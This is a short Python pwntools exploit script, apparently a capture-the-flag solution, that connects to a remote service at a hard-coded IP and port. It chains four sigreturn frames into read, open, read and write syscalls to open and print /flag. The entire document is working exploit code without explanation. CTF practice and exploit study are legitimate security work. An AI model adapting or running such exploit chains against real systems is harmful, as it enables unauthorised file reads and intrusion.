from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process("./pwn")
s=remote("8.130.35.16",53002)
rax=0x401388
syscall=0x401385

f1=SigreturnFrame()
f1.rax=0
f1.rdi=0
f1.rsi=0x404400
f1.rdx=0x1000
f1.rip=syscall
f1.rsp=0x404400

f2=SigreturnFrame()
f2.rax=2
f2.rdi=0x404400+0x318
f2.rsi=0
f2.rdx=0
f2.rip=syscall
f2.rsp=0x404400+len(f2)+0x10

f3=SigreturnFrame()
f3.rax=0
f3.rdi=3
f3.rsi=0x404400+0x318
f3.rdx=0x100
f3.rip=syscall
f3.rsp=0x404400+len(f3)*2+0x20

f4=SigreturnFrame()
f4.rax=1
f4.rdi=1
f4.rsi=0x404400+0x318
f4.rdx=0x100
f4.rip=syscall
pause()
s.send(flat([
    b"a"*0x10,
    rax,syscall,bytes(f1),
]))

s.send(flat([
    rax,syscall,bytes(f2),
    rax,syscall,bytes(f3),
    rax,syscall,bytes(f4),
    b"/flag\x00"
]))

s.interactive()
